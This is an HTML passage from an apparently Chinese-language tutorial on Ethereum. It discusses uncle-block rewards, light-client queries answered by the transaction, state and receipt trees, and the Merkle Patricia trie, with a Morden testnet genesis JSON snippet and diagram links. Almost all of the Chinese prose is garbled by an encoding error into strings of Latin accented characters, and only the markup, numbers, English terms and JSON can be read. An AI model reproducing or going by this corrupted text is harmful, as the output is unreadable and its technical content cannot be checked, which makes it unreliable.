ä¸º<strong>ä¸æ˜¯æœ€é•¿é“¾ä¸ŠåŒºå—çš„ç›´æ¥å­å—ï¼Œè¿™ç§åŒºå—ä¸èƒ½æˆä¸ºå”åŒºå—ã€‚</strong></p>
<p>å¦‚æœåœ¨101å’Œ106çš„åŒºå—é«˜åº¦ï¼Œæœ‰å¤šä¸ªæ²¡è¢«å¼•ç”¨çš„å”å—ï¼Œé«˜åº¦ä¸º107çš„åŒºå—åšå¤šåªèƒ½å¼•ç”¨ä¸¤ä¸ªï¼Œè€Œä¸”<strong>ä¸€ä¸ªå”å—è¢«å®ƒå¼•ç”¨åï¼Œå°±ä¸èƒ½å†è¢«å…¶ä»–åŒºå—é‡å¤å¼•ç”¨ã€‚</strong></p>
<p>è¢«å¼•ç”¨çš„å”å—è·å¾—å¥–åŠ±æ•°é‡ï¼Œå–å†³ä¸è¯¥å”å—å’Œå¼•ç”¨åŒºå—çš„â€œè¿œè¿‘â€å…³ç³»ã€‚<strong>å…³ç³»è¶Šè¿‘ï¼Œå”å—å¾—åˆ°å¥–åŠ±è¶Šå¤šã€‚</strong>è€Œå¼•ç”¨å”å—çš„åŒºå—ï¼Œæ¯å¼•ç”¨ä¸€ä¸ªåŒºå—ï¼Œéƒ½èƒ½å¾—åˆ°ç³»ç»Ÿå‡ºå—å¥–åŠ±çš„1&#x2F;32ï¼Œæœ€å¤šåªèƒ½å¼•ç”¨ä¸¤ä¸ªåŒºå—ã€‚å½“å‰ä»¥å¤ªåŠæ–°åŒºå—è·å¾—ç³»ç»Ÿå¥–åŠ±ä¸º2æšä»¥å¤ªå¸ï¼ˆ2etherï¼‰ï¼Œå¦‚æœå”å—åœ¨é—´éš”ä¸€å±‚å°±è¢«å¼•ç”¨ï¼Œè¯¥å”å—å°†è·å¾—å‡ºå—å¥–åŠ±çš„7&#x2F;8ï¼Œä¹Ÿå°±æ˜¯1.75etherï¼Œå¦‚æœå”å—éš”äº†6å±‚æ‰è¢«å¼•ç”¨ï¼Œå®ƒè·å¾—å¥–åŠ±åªæœ‰0.5etherï¼Œå…·ä½“å¦‚ä¸‹è¡¨ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233077.jpg" alt="img">é—´éš”å±‚æ•°ä¸å”å—å¥–åŠ±çš„å…³ç³»</p>
<p>çœ‹ä¸€ä¸ªçœŸå®çš„å—çš„æƒ…å†µ<a href="https://link.zhihu.com/?target=https://etherscan.io/block/4222300">4222300</a></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233078.jpg" alt="img"></p>
<hr>
<p>ç”±äºä»¥ä¸Šç‰¹æ€§ï¼Œä»¥å¤ªåŠçš„è½»å®¢æˆ·ç«¯æ¯”Bitcoinçš„è½»å®¢æˆ·ç«¯åŠŸèƒ½æ›´å¼ºã€‚Bitcoinçš„è½»å®¢æˆ·ç«¯å¯ä»¥è¯æ˜åŒ…å«çš„äº¤æ˜“ï¼Œä½†æ˜¯å®ƒä¸èƒ½è¿›è¡Œæ¶‰åŠå½“å‰çŠ¶æ€çš„è¯æ˜ï¼ˆå¦‚æ•°å­—èµ„äº§çš„æŒæœ‰ï¼Œåç§°æ³¨å†Œï¼Œé‡‘èåˆçº¦çš„çŠ¶æ€ç­‰ï¼‰ã€‚è€Œä»¥å¤ªåŠçš„è½»å®¢æˆ·ç«¯èƒ½å¤Ÿè½»æ¾åœ°è¿›è¡Œå¹¶æ ¸å®ä»¥ä¸‹ç±»å‹çš„æŸ¥è¯¢ç­”æ¡ˆï¼š</p>
<ul>
<li>è¿™ç¬”äº¤æ˜“è¢«åŒ…å«åœ¨ç‰¹å®šçš„åŒºå—ä¸­äº†ä¹ˆï¼Ÿ</li>
<li>å‘Šè¯‰æˆ‘è¿™ä¸ªåœ°å€åœ¨è¿‡å»30å¤©ä¸­ï¼Œå‘å‡ºXç±»å‹äº‹ä»¶çš„æ‰€æœ‰å®ä¾‹ï¼ˆä¾‹å¦‚ï¼Œä¸€ä¸ªä¼—ç­¹åˆçº¦å®Œæˆäº†å®ƒçš„ç›®æ ‡ï¼‰</li>
<li>ç›®å‰æˆ‘çš„è´¦æˆ·ä½™é¢æ˜¯å¤šå°‘ï¼Ÿ</li>
<li>è¿™ä¸ªè´¦æˆ·æ˜¯å¦å­˜åœ¨ï¼Ÿ</li>
<li>å‡è£…åœ¨è¿™ä¸ªåˆçº¦ä¸­è¿è¡Œè¿™ç¬”äº¤æ˜“ï¼Œå®ƒçš„è¾“å‡ºä¼šæ˜¯ä»€ä¹ˆï¼Ÿ</li>
</ul>
<p>ç¬¬ä¸€ç§æ˜¯ç”±äº¤æ˜“æ ‘ï¼ˆtransaction treeï¼‰æ¥å¤„ç†çš„ï¼›ç¬¬ä¸‰å’Œç¬¬å››ç§åˆ™æ˜¯ç”±çŠ¶æ€æ ‘ï¼ˆstate treeï¼‰è´Ÿè´£å¤„ç†ï¼Œç¬¬äºŒç§åˆ™ç”±æ”¶æ®æ ‘ï¼ˆreceipt treeï¼‰å¤„ç†ã€‚è®¡ç®—å‰å››ä¸ªæŸ¥è¯¢ä»»åŠ¡æ˜¯ç›¸å½“ç®€å•çš„ã€‚æœåŠ¡å™¨ç®€å•åœ°æ‰¾åˆ°å¯¹è±¡ï¼Œè·å–Merkleåˆ†æ”¯ï¼Œå¹¶é€šè¿‡åˆ†æ”¯æ¥å›å¤è½»å®¢æˆ·ç«¯ã€‚ç¬¬äº”ç§æŸ¥è¯¢ä»»åŠ¡åŒæ ·ä¹Ÿæ˜¯ç”±çŠ¶æ€æ ‘å¤„ç†ï¼Œä½†å®ƒçš„è®¡ç®—æ–¹å¼ä¼šæ¯”è¾ƒå¤æ‚ã€‚</p>
<p>è¿™äº›æ ‘ä½¿ç”¨äº†ä¸€ä¸ªéå¸¸é‡è¦çš„æ•°æ®ç»“æ„ã€‚é»˜å…‹å°”å¸•ç‰¹é‡Œå¤æ ‘(Merkle Patricia tree&#x2F;trie)ï¼Œç”±Alan Reineræå‡ºè®¾æƒ³ï¼Œå¹¶åœ¨ç‘æ³¢åè®®ä¸­å¾—åˆ°å®ç°ï¼Œæ˜¯ä»¥å¤ªåŠçš„ä¸»è¦æ•°æ®ç»“æ„ï¼Œç”¨äºå­˜å‚¨æ‰€æœ‰è´¦æˆ·çŠ¶æ€ï¼Œä»¥åŠæ¯ä¸ªåŒºå—ä¸­çš„äº¤æ˜“å’Œæ”¶æ®æ•°æ®ã€‚MPTæ˜¯é»˜å…‹å°”æ ‘å’Œå¸•ç‰¹é‡Œå¤æ ‘çš„ç»“åˆç¼©å†™ï¼Œç»“åˆè¿™ä¸¤ç§æ ‘åˆ›å»ºçš„ç»“æ„å…·æœ‰ä»¥ä¸‹å±æ€§ï¼š</p>
<ol>
<li>æ¯ä¸ªå”¯ä¸€é”®å€¼å¯¹å”¯ä¸€æ˜ å°„åˆ°æ ¹çš„hashå€¼ï¼›åœ¨MPTä¸­ï¼Œä¸å¯èƒ½ä»…ç”¨ä¸€ä¸ªé”®å€¼å¯¹æ¥æ¬ºéª—æˆå‘˜ï¼ˆé™¤éæ”»å‡»è€…æœ‰~2^128 çš„ç®—åŠ›ï¼‰ï¼›</li>
<li>å¢ã€åˆ ã€æ”¹é”®å€¼å¯¹çš„æ—¶é—´å¤æ‚åº¦æ˜¯å¯¹æ•°çº§åˆ«ã€‚</li>
</ol>
<p>MPTä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä¸ªé«˜æ•ˆã€æ˜“æ›´æ–°ã€ä¸”ä»£è¡¨æ•´ä¸ªçŠ¶æ€æ ‘çš„â€œæŒ‡çº¹â€ã€‚</p>
<p>äºŒå‰Merkleæ ‘å¯¹äºéªŒè¯â€œæ¸…å•â€æ ¼å¼çš„ä¿¡æ¯è€Œè¨€ï¼Œæ˜¯éå¸¸å¥½çš„æ•°æ®ç»“æ„ï¼Œæœ¬è´¨ä¸Šæ¥è®²ï¼Œå®ƒå°±æ˜¯ä¸€ç³»åˆ—å‰åç›¸è¿çš„æ•°æ®å—ã€‚å¯¹äºäº¤æ˜“æ ‘æ¥è¯´ï¼Œå®ƒä»¬ä¹ŸåŒæ ·æ˜¯ä¸é”™çš„ï¼Œå› ä¸ºä¸€æ—¦æ ‘å·²ç»å»ºç«‹ï¼ŒèŠ±å¤šå°‘æ—¶é—´æ¥ç¼–è¾‘è¿™æ£µæ ‘å¹¶ä¸é‡è¦ï¼Œæ ‘ä¸€æ—¦å»ºç«‹äº†ï¼Œå®ƒå°±ä¼šæ°¸è¿œå­˜åœ¨ã€‚</p>
<p>è€Œå¯¹çŠ¶æ€æ ‘æ¥è¯´ï¼Œæƒ…å†µä¼šæ›´å¤æ‚äº›ã€‚ä»¥å¤ªåŠä¸­çš„çŠ¶æ€æ ‘åŸºæœ¬ä¸ŠåŒ…å«äº†ä¸€ä¸ªé”®å€¼æ˜ å°„ï¼Œå…¶ä¸­çš„é”®æ˜¯åœ°å€è¿˜æœ‰å„ç§å€¼ï¼ŒåŒ…æ‹¬è´¦æˆ·çš„å£°æ˜ã€ä½™é¢ã€éšæœºæ•°ã€ä»£ç ä»¥åŠæ¯ä¸€ä¸ªè´¦æˆ·çš„å­˜å‚¨ï¼ˆå…¶ä¸­å­˜å‚¨æœ¬èº«å°±æ˜¯ä¸€é¢—æ ‘ï¼‰ã€‚ä¾‹å¦‚ï¼Œthe Morden testnet çš„åˆ›å§‹çŠ¶æ€å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&#123; &quot;0000000000000000000000000000000000000001&quot;: &#123; &quot;balance&quot;: &quot;1&quot; &#125;, &quot;0000000000000000000000000000000000000002&quot;: &#123; &quot;balance&quot;: &quot;1&quot; &#125;, &quot;0000000000000000000000000000000000000003&quot;: &#123; &quot;balance&quot;: &quot;1&quot; &#125;, &quot;0000000000000000000000000000000000000004&quot;: &#123; &quot;balance&quot;: &quot;1&quot; &#125;, &quot;102e61f5d8f9bc71d0ad4a084df4e65e05ce0e1c&quot;: &#123; &quot;balance&quot;: &quot;1606938044258990275541962092341162602522202993782792835301376&quot; &#125; &#125;</span><br></pre></td></tr></table></figure>

<p>ä¸åŒäºäº¤æ˜“å†å²è®°å½•ï¼ŒçŠ¶æ€æ ‘éœ€è¦ç»å¸¸åœ°è¿›è¡Œæ›´æ–°ï¼šè´¦æˆ·ä½™é¢å’Œè´¦æˆ·çš„éšæœºæ•°nonceç»å¸¸ä¼šæ›´å˜ï¼Œæ›´é‡è¦çš„æ˜¯ï¼Œæ–°çš„è´¦æˆ·ä¼šé¢‘ç¹åœ°æ’å…¥ï¼Œå­˜å‚¨çš„é”®ï¼ˆ keyï¼‰ä¹Ÿä¼šç»å¸¸è¢«æ’å…¥ä»¥åŠåˆ é™¤ã€‚MPTçš„æ•°æ®ç»“æ„è®¾è®¡ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥åœ¨ä¸€æ¬¡æ’å…¥ã€æ›´æ–°ç¼–è¾‘æˆ–è€…åˆ é™¤æ“ä½œä¹‹åï¼Œå¿«é€Ÿåœ°è®¡ç®—å‡ºæ–°çš„æ ‘æ ¹ï¼ˆtree rootï¼‰ï¼Œè€Œæ— éœ€é‡æ–°è®¡ç®—æ•´é¢—æ ‘ã€‚æ­¤å¤–ï¼Œå®ƒè¿˜æœ‰ä¸¤ä¸ªéå¸¸å¥½çš„ç‰¹æ€§ï¼š</p>
<ol>
<li>æ ‘çš„æ·±åº¦æ˜¯æœ‰é™åˆ¶çš„ã€‚è€ƒè™‘åˆ°æ”»å‡»è€…ä¼šæ•…æ„åœ°åˆ¶é€ ä¸€äº›äº¤æ˜“ï¼Œä½¿å¾—è¿™æ£µæ ‘å°½å¯èƒ½åœ°æ·±ï¼Œä»è€Œå¯ä»¥é€šè¿‡æ“çºµæ ‘çš„æ·±åº¦ï¼Œæ‰§è¡Œæ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆDOS attackï¼‰ï¼Œä½¿å¾—æ›´æ–°å˜å¾—æå…¶ç¼“æ…¢ã€‚</li>
<li>æ ‘çš„æ ¹åªå–å†³äºæ•°æ®ï¼Œå’Œå…¶ä¸­çš„æ›´æ–°é¡ºåºæ— å…³ã€‚æ¢ä¸ªé¡ºåºè¿›è¡Œæ›´æ–°ï¼Œç”šè‡³é‡æ–°ä»å¤´è®¡ç®—æ ‘ï¼Œå¹¶ä¸ä¼šæ”¹å˜æ ¹ã€‚</li>
</ol>
<p><strong>å¸•ç‰¹é‡Œå¤æ ‘ï¼ˆPatricia Treesï¼‰ï¼ˆå‹ç¼©å‰ç¼€æ ‘ï¼‰</strong></p>
<p>Merkle Patricia Treeï¼ˆåˆç§°ä¸ºMerkle Patricia Trieï¼‰æ˜¯ä¸€ç§ç»è¿‡æ”¹è‰¯çš„ã€èåˆäº†é»˜å…‹å°”æ ‘å’Œå‰ç¼€æ ‘ä¸¤ç§æ ‘ç»“æ„ä¼˜ç‚¹çš„æ•°æ®ç»“æ„ï¼Œæ˜¯ä»¥å¤ªåŠä¸­ç”¨æ¥ç»„ç»‡ç®¡ç†è´¦æˆ·æ•°æ®ã€ç”Ÿæˆäº¤æ˜“é›†åˆå“ˆå¸Œçš„é‡è¦æ•°æ®ç»“æ„ã€‚</p>
<p>MPTç»“åˆäº†ï¼ˆ1ï¼‰radix trie (patricia)ï¼ˆ2ï¼‰Merkle treeä¸¤ç§æ ‘ç»“æ„çš„ç‰¹ç‚¹ä¸ä¼˜åŠ¿ ï¼Œå› ä¸ºMerkleæ ‘ä¹‹å‰å·²ç»è¯¦ç»†ä»‹ç»è¿‡ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥è®¨è®ºå‰ç¼€æ ‘ä»¥åŠå‹ç¼©å‰ç¼€æ ‘ï¼ˆpatriciaæ ‘ï¼‰ã€‚</p>
<p>Trieæ ‘ï¼Œåˆç§°å‰ç¼€æ ‘æˆ–å­—å…¸æ ‘ï¼Œæ˜¯ä¸€ç§æœ‰åºæ ‘ï¼Œç”¨äºä¿å­˜å…³è”æ•°ç»„ï¼Œå…¶ä¸­çš„é”®é€šå¸¸æ˜¯å­—ç¬¦ä¸²ã€‚ä¸äºŒå‰æŸ¥æ‰¾æ ‘ä¸åŒï¼Œé”®ä¸æ˜¯ç›´æ¥ä¿å­˜åœ¨èŠ‚ç‚¹ä¸­ï¼Œè€Œæ˜¯ç”±èŠ‚ç‚¹åœ¨æ ‘ä¸­çš„ä½ç½®å†³å®šã€‚ä¸€ä¸ªèŠ‚ç‚¹çš„æ‰€æœ‰å­å­™éƒ½æœ‰ç›¸åŒçš„å‰ç¼€ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªèŠ‚ç‚¹å¯¹åº”çš„å­—ç¬¦ä¸²ï¼Œè€Œæ ¹èŠ‚ç‚¹å¯¹åº”ç©ºå­—ç¬¦ä¸²ã€‚</p>
<p>ä¸‹é¢è¿™æ£µtrieåŒ…å«è¿™æ ·ä¸€ç»„å•è¯ï¼Œinn, int, at, age, adv, ant æ¯ä¸ªèŠ‚ç‚¹å­˜å‚¨çš„æ˜¯å­—ç¬¦ä¸²ä¸­çš„éƒ¨åˆ†å­—ç¬¦ï¼Œæ¯ä¸ªä»æ ¹åˆ°æŸä¸ªèŠ‚ç‚¹çš„è·¯å¾„ï¼ˆä¸ä¸€å®šåˆ°å¶å­èŠ‚ç‚¹ï¼‰ä»£è¡¨äº†ä¸€ä¸ªå­˜å‚¨çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœæƒ³æŸ¥æ‰¾advæ˜¯å¦å­˜åœ¨ï¼Œåªéœ€è¦èµ°çº¢åœˆè¿™æ ·çš„è·¯å¾„å³å¯ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233079.jpg" alt="img"></p>
<p>Trieçš„æ ¸å¿ƒæ€æƒ³æ˜¯ç©ºé—´æ¢æ—¶é—´ã€‚åˆ©ç”¨å­—ç¬¦ä¸²çš„å…¬å…±å‰ç¼€æ¥é™ä½æŸ¥è¯¢æ—¶é—´çš„å¼€é”€ä»¥è¾¾åˆ°æé«˜æ•ˆç‡çš„ç›®çš„ã€‚å®ƒæœ‰3ä¸ªåŸºæœ¬æ€§è´¨ï¼š</p>
<ol>
<li>æ ¹èŠ‚ç‚¹ä¸åŒ…å«å­—ç¬¦ï¼Œé™¤æ ¹èŠ‚ç‚¹å¤–æ¯ä¸€ä¸ªèŠ‚ç‚¹éƒ½åªåŒ…å«ä¸€ä¸ªå­—ç¬¦ã€‚</li>
<li>ä»æ ¹èŠ‚ç‚¹åˆ°æŸä¸€èŠ‚ç‚¹ï¼Œè·¯å¾„ä¸Šç»è¿‡çš„å­—ç¬¦è¿æ¥èµ·æ¥ï¼Œä¸ºè¯¥èŠ‚ç‚¹å¯¹åº”çš„å­—ç¬¦ä¸²ã€‚</li>
<li>æ¯ä¸ªèŠ‚ç‚¹çš„æ‰€æœ‰å­èŠ‚ç‚¹åŒ…å«çš„å­—ç¬¦éƒ½ä¸ç›¸åŒã€‚</li>
</ol>
<p>å…¸å‹åº”ç”¨æ˜¯ç”¨äºç»Ÿè®¡å’Œæ’åºå¤§é‡çš„å­—ç¬¦ä¸²ï¼ˆä½†ä¸ä»…é™äºå­—ç¬¦ä¸²ï¼‰ï¼Œæ‰€ä»¥ç»å¸¸è¢«æœç´¢å¼•æ“ç³»ç»Ÿç”¨äºæ–‡æœ¬è¯é¢‘ç»Ÿè®¡ã€‚å®ƒçš„ä¼˜ç‚¹æ˜¯ï¼šæœ€å¤§é™åº¦åœ°å‡å°‘æ— è°“çš„å­—ç¬¦ä¸²æ¯”è¾ƒã€‚ä¸¾ä¸ªå…·ä½“çš„ä¾‹å­ï¼š</p>
<p>é¢˜ç›®ï¼šç»™ä½ 100000ä¸ªé•¿åº¦ä¸è¶…è¿‡10çš„å•è¯ã€‚å¯¹äºæ¯ä¸€ä¸ªå•è¯ï¼Œæˆ‘ä»¬è¦åˆ¤æ–­å®ƒå‡ºæ²¡å‡ºç°è¿‡ï¼Œå¦‚æœå‡ºç°äº†ï¼Œæ±‚ç¬¬ä¸€æ¬¡å‡ºç°åœ¨ç¬¬å‡ ä¸ªä½ç½®ã€‚<br>åˆ†æï¼šè¿™é¢˜å½“ç„¶å¯ä»¥ç”¨hashæ¥è§£å†³ï¼Œä½†æ˜¯æ¯”å¦‚è¯´å¯¹äºæŸä¸€ä¸ªå•è¯ï¼Œæˆ‘ä»¬è¦è¯¢é—®å®ƒçš„å‰ç¼€æ˜¯å¦å‡ºç°è¿‡ã€‚è¿™æ ·hashå°±ä¸å¤ªé€‚ç”¨ï¼Œè€Œç”¨trieè¿˜æ˜¯å¾ˆç®€å•ã€‚<br>ç°åœ¨å›åˆ°ä¾‹å­ä¸­ï¼Œå¦‚æœæˆ‘ä»¬ç”¨æœ€æœ´å®çš„æ–¹æ³•ï¼Œå¯¹äºæ¯ä¸€ä¸ªå•è¯ï¼Œæˆ‘ä»¬éƒ½è¦å»æŸ¥æ‰¾å®ƒå‰é¢çš„å•è¯ä¸­æ˜¯å¦æœ‰å®ƒã€‚é‚£ä¹ˆè¿™ä¸ªç®—æ³•çš„å¤æ‚åº¦å°±æ˜¯O(n^2)ã€‚æ˜¾ç„¶å¯¹äº100000çš„èŒƒå›´éš¾ä»¥æ¥å—ã€‚ç°åœ¨æˆ‘ä»¬æ¢ä¸ªæ€è·¯æƒ³ã€‚å‡è®¾æˆ‘è¦æŸ¥è¯¢çš„å•è¯æ˜¯abcdï¼Œé‚£ä¹ˆåœ¨å‰é¢çš„å•è¯ä¸­ï¼Œä»¥bï¼Œcï¼Œdï¼Œfä¹‹ç±»å¼€å¤´çš„æ˜¾ç„¶ä¸å¿…è€ƒè™‘ã€‚è€Œåªè¦æ‰¾ä»¥aå¼€å¤´çš„ä¸­æ˜¯å¦å­˜åœ¨abcdå°±å¯ä»¥äº†ã€‚åŒæ ·çš„ï¼Œåœ¨ä»¥aå¼€å¤´ä¸­çš„å•è¯ä¸­ï¼Œæˆ‘ä»¬åªè¦è€ƒè™‘ä»¥bä½œä¸ºç¬¬äºŒä¸ªå­—æ¯çš„ï¼Œä¸€æ¬¡æ¬¡ç¼©å°èŒƒå›´å’Œæé«˜é’ˆå¯¹æ€§ï¼Œè¿™æ ·ä¸€ä¸ªæ ‘çš„æ¨¡å‹å°±æ¸æ¸æ¸…æ™°äº†ã€‚<br>å¥½æ¯”å‡è®¾æœ‰bï¼Œabcï¼Œabdï¼Œbcdï¼Œabcdï¼Œefgï¼Œhii è¿™6ä¸ªå•è¯ï¼Œæˆ‘ä»¬æ„å»ºçš„æ ‘å°±æ˜¯å¦‚ä¸‹å›¾è¿™æ ·çš„ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233080.jpg" alt="img"></p>
<p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå¯¹äºæ¯ä¸€ä¸ªèŠ‚ç‚¹ï¼Œä»æ ¹éå†åˆ°ä»–çš„è¿‡ç¨‹å°±æ˜¯ä¸€ä¸ªå•è¯ï¼Œå¦‚æœè¿™ä¸ªèŠ‚ç‚¹è¢«æ ‡è®°ä¸ºçº¢è‰²ï¼Œå°±è¡¨ç¤ºè¿™ä¸ªå•è¯å­˜åœ¨ï¼Œå¦åˆ™ä¸å­˜åœ¨ã€‚é‚£ä¹ˆï¼Œå¯¹äºä¸€ä¸ªå•è¯ï¼Œæˆ‘åªè¦é¡ºç€ä»æ ¹èµ°åˆ°å¯¹åº”çš„èŠ‚ç‚¹ï¼Œå†çœ‹è¿™ä¸ªèŠ‚ç‚¹æ˜¯å¦è¢«æ ‡è®°ä¸ºçº¢è‰²å°±å¯ä»¥çŸ¥é“å®ƒæ˜¯å¦å‡ºç°è¿‡äº†ã€‚æŠŠè¿™ä¸ªèŠ‚ç‚¹æ ‡è®°ä¸ºçº¢è‰²ï¼Œå°±ç›¸å½“äºæ’å…¥äº†è¿™ä¸ªå•è¯ã€‚è¿™æ ·ä¸€æ¥æˆ‘ä»¬æŸ¥è¯¢å’Œæ’å…¥å¯ä»¥ä¸€èµ·å®Œæˆï¼Œæ‰€ç”¨æ—¶é—´ä»…ä»…ä¸ºå•è¯é•¿åº¦ï¼Œåœ¨è¿™ä¸€ä¸ªæ ·ä¾‹ï¼Œä¾¿æ˜¯10ã€‚</p>
<p>ä»¥ä¸Šåªæ˜¯ç®€åŒ–è¡¨ç¤ºï¼Œå®é™…ä¸Šï¼Œtrieæ¯ä¸ªèŠ‚ç‚¹æ˜¯ä¸€ä¸ªç¡®å®šé•¿åº¦çš„æ•°ç»„ï¼Œæ•°ç»„ä¸­æ¯ä¸ªèŠ‚ç‚¹çš„å€¼æ˜¯ä¸€ä¸ªæŒ‡å‘å­èŠ‚ç‚¹çš„æŒ‡é’ˆï¼Œæœ€åæœ‰ä¸ªæ ‡å¿—åŸŸï¼Œæ ‡è¯†è¿™ä¸ªä½ç½®ä¸ºæ­¢æ˜¯å¦æ˜¯ä¸€ä¸ªå®Œæ•´çš„å­—ç¬¦ä¸²ã€‚ä»è¿™ä¸ªæ„ä¹‰ä¸Šè®²ï¼Œtrieæ ‘æ¯ä¸€å±‚çš„èŠ‚ç‚¹æ•°æ˜¯26^içº§åˆ«çš„ï¼Œä½†å®é™…ä¸Šå¹¶æ²¡æœ‰è¿™ä¹ˆå¤šï¼Œå¾ˆå¤šä½ç½®çš„ç›¸åº”æŒ‡é’ˆä¸ºç©ºã€‚</p>
<p>å¸¸è§çš„ç”¨æ¥å­˜è‹±æ–‡å•è¯çš„trieæ¯ä¸ªèŠ‚ç‚¹æ˜¯ä¸€ä¸ªé•¿åº¦ä¸º27çš„æŒ‡é’ˆæ•°ç»„ï¼Œindex0-25ä»£è¡¨a-zå­—ç¬¦ï¼Œ26ä¸ºæ ‡å¿—åŸŸã€‚å¦‚å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233081.jpg" alt="img"></p>
<p>ç¼ºç‚¹ï¼š</p>
<ul>
<li>ç›´æ¥æŸ¥æ‰¾æ•ˆç‡è¾ƒä½</li>
</ul>
<p>å‰ç¼€æ ‘çš„æŸ¥æ‰¾æ•ˆç‡æ˜¯O(m)ï¼Œmä¸ºæ‰€æŸ¥æ‰¾èŠ‚ç‚¹çš„keyé•¿åº¦ï¼Œè€Œå“ˆå¸Œè¡¨çš„æŸ¥æ‰¾æ•ˆç‡ä¸ºO(1)ã€‚ä¸”ä¸€æ¬¡æŸ¥æ‰¾ä¼šæœ‰mæ¬¡IOå¼€é”€ï¼Œç›¸æ¯”äºç›´æ¥æŸ¥æ‰¾ï¼Œæ— è®ºæ˜¯é€Ÿç‡ã€è¿˜æ˜¯å¯¹ç£ç›˜çš„å‹åŠ›éƒ½æ¯”è¾ƒå¤§ã€‚</p>
<ul>
<li>å¯èƒ½ä¼šé€ æˆç©ºé—´æµªè´¹</li>
</ul>
<p>å½“å­˜åœ¨ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå…¶keyå€¼å†…å®¹å¾ˆé•¿ï¼ˆå¦‚ä¸€ä¸²å¾ˆé•¿çš„å­—ç¬¦ä¸²ï¼‰ï¼Œå½“æ ‘ä¸­æ²¡æœ‰ä¸ä»–ç›¸åŒå‰ç¼€çš„åˆ†æ”¯æ—¶ï¼Œä¸ºäº†å­˜å‚¨è¯¥èŠ‚ç‚¹ï¼Œéœ€è¦åˆ›å»ºè®¸å¤šéå¶å­èŠ‚ç‚¹æ¥æ„å»ºæ ¹èŠ‚ç‚¹åˆ°è¯¥èŠ‚ç‚¹é—´çš„è·¯å¾„ï¼Œé€ æˆäº†å­˜å‚¨ç©ºé—´çš„æµªè´¹ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233082.jpg" alt="img"></p>
<p><strong>å¯¹å‰ç¼€æ ‘çš„æ”¹è¿›ï¼šPatriciaæ ‘</strong></p>
<p>Patricia trieï¼Œå‹ç¼©å‰ç¼€æ ‘ï¼Œæ˜¯ä¸€ç§æ›´èŠ‚çœç©ºé—´çš„Trieã€‚å¯¹äºåŸºæ•°æ ‘çš„æ¯ä¸ªèŠ‚ç‚¹ï¼Œå¦‚æœè¯¥èŠ‚ç‚¹æ˜¯å”¯ä¸€çš„å„¿å­çš„è¯ï¼Œå°±å’Œçˆ¶èŠ‚ç‚¹åˆå¹¶ã€‚</p>
<p>å¦‚ä¹‹å‰æ‰€æåŠçš„ï¼Œå‰ç¼€æ ‘ä¸­ä¼šå‡ºç°ä¸¥é‡çš„å­˜å‚¨ç©ºé—´æµªè´¹çš„æƒ…å†µï¼Œå¦‚ä¸Šå›¾ã€‚å›¾ä¸­å³ä¾§æœ‰ä¸€é•¿ä¸²èŠ‚ç‚¹ï¼Œè¿™äº›èŠ‚ç‚¹å¤§éƒ¨åˆ†åªæ˜¯å……å½“éå¶å­èŠ‚ç‚¹ï¼Œç”¨æ¥æ„å»ºä¸€æ¡è·¯å¾„ï¼Œç›®çš„åªæ˜¯ä¸ºäº†å­˜å‚¨è¯¥è·¯å¾„ä¸Šçš„å¶å­èŠ‚ç‚¹ã€‚</p>
<p>é’ˆå¯¹è¿™ç§æƒ…å†µï¼ŒMPTæ ‘å¯¹æ­¤è¿›è¡Œäº†ä¼˜åŒ–ï¼šå½“MPTè¯•å›¾æ’å…¥ä¸€ä¸ªèŠ‚ç‚¹ï¼Œæ’å…¥è¿‡ç¨‹ä¸­å‘ç°ç›®å‰æ²¡æœ‰ä¸è¯¥èŠ‚ç‚¹Keyæ‹¥æœ‰ç›¸åŒå‰ç¼€çš„è·¯å¾„ã€‚æ­¤æ—¶MPTæŠŠ<strong>å‰©ä½™çš„Key</strong>å­˜å‚¨åœ¨å¶å­ï¼æ‰©å±•èŠ‚ç‚¹çš„Keyå­—æ®µä¸­ï¼Œå……å½“ä¸€ä¸ªâ€Shortcutâ€œã€‚</p>
<p>ä¸‹å›¾ä¸­å¯¹åº”ç€å°†5ä¸ªå•è¯testã€toasterã€toastingã€slowã€slowlyæ’å…¥åˆ°æ ‘ä¸­ï¼Œå…¶ä¸­æœ‰ä¸‰ä¸ªå•è¯å…±äº«tå‰ç¼€ï¼Œä¸¤ä¸ªå•è¯å…±äº«så‰ç¼€ï¼Œtå’Œsä¸åŒï¼Œæ‰€ä»¥åœ¨æ ¹èŠ‚ç‚¹ä¸Šæœ‰ä¸¤ä¸ªåˆ†æ”¯ã€‚åœ¨å·¦è¾¹çš„åˆ†æ”¯ï¼ˆtï¼‰ä¸Šï¼Œæœ‰ä¸¤ä¸ªåˆ†æ”¯ï¼Œè€Œä¸”estæ˜¯æ²¡æœ‰å’Œå…¶ä»–ä»»ä½•å•è¯å…±äº«å‰ç¼€ï¼Œä¹Ÿå³çˆ¶èŠ‚ç‚¹åªæœ‰ä¸€ä¸ªå­©å­ï¼Œåˆ™estå¯ä»¥è¢«å‹ç¼©ã€‚ç±»ä¼¼åœ°oastå’Œslowä»¥åŠlyå¯ä»¥è¿›è¡Œå‹ç¼©ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233083.jpg" alt="img"></p>
<p>è¿™ç§åšæ³•æœ‰ä»¥ä¸‹å‡ ç‚¹ä¼˜åŠ¿ï¼š</p>
<ul>
<li>æé«˜èŠ‚ç‚¹çš„æŸ¥æ‰¾æ•ˆç‡ï¼Œé¿å…è¿‡å¤šçš„ç£ç›˜è®¿é—®ï¼›</li>
